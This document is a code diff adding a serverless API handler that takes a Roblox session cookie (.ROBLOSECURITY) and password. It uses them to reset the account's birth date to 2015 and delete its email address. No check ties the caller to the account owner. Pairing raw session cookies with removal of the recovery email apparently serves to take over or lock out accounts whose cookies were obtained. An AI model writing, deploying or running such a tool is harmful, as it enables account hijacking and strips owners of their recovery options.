@@ -1,0 +1,97 @@
+export default async function handler(req, res) {
+    if (req.method !== 'POST') {
+        return res.status(405).json({ error: 'Method not allowed' });
+    }
+
+    const { cookie, password } = req.body;
+    if (!cookie || !password) {
+        return res.status(400).json({ error: 'Missing cookie or password' });
+    }
+
+    // Helper to get CSRF token
+    async function getCsrfToken() {
+        const resp = await fetch('https://auth.roblox.com/v2/logout', {
+            method: 'POST',
+            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+        });
+        const token = resp.headers.get('x-csrf-token');
+        if (!token) throw new Error('Failed to get CSRF token – cookie may be invalid');
+        return token;
+    }
+
+    // Get user info
+    async function getUserInfo(csrf) {
+        const resp = await fetch('https://users.roblox.com/v1/users/authenticated', {
+            headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'x-csrf-token': csrf }
+        });
+        if (!resp.ok) throw new Error('Cannot authenticate');
+        return resp.json();
+    }
+
+    // Change birth date to 2015
+    async function changeBirthDate(csrf) {
+        const payload = { birthYear: 2015, birthMonth: 1, birthDay: 1 };
+        const resp = await fetch('https://users.roblox.com/v1/account/settings/birthdate', {
+            method: 'PATCH',
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${cookie}`,
+                'x-csrf-token': csrf,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        });
+        if (!resp.ok) {
+            const text = await resp.text();
+            throw new Error(`Birth date change failed (${resp.status}): ${text}`);
+        }
+        return true;
+    }
+
+    // Remove email using password
+    async function removeEmail(csrf, pwd) {
+        const resp = await fetch('https://accountsettings.roblox.com/v1/email', {
+            method: 'POST',
+            headers: {
+                'Cookie': `.ROBLOSECURITY=${cookie}`,
+                'x-csrf-token': csrf,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ emailAddress: "", password: pwd })
+        });
+        if (!resp.ok) {
+            const text = await resp.text();
+            throw new Error(`Email removal failed (${resp.status}): ${text}`);
+        }
+        return true;
+    }
+
+    try {
+        const csrf = await getCsrfToken();
+        const user = await getUserInfo(csrf);
+        
+        let birthResult = false, emailResult = false;
+        let birthError = null, emailError = null;
+
+        try {
+            await changeBirthDate(csrf);
+            birthResult = true;
+        } catch (e) { birthError = e.message; }
+
+        try {
+            await removeEmail(csrf, password);
+            emailResult = true;
+        } catch (e) { emailError = e.message; }
+
+        res.status(200).json({
+            success: true,
+            user: { name: user.name, id: user.id },
+            birthDateChanged: birthResult,
+            birthDateError: birthError,
+            emailRemoved: emailResult,
+            emailError: emailError,
+            warning: "May fail due to Roblox security (parental PIN, verification)."
+        });
+    } catch (err) {
+        res.status(500).json({ error: err.message });
+    }
+}
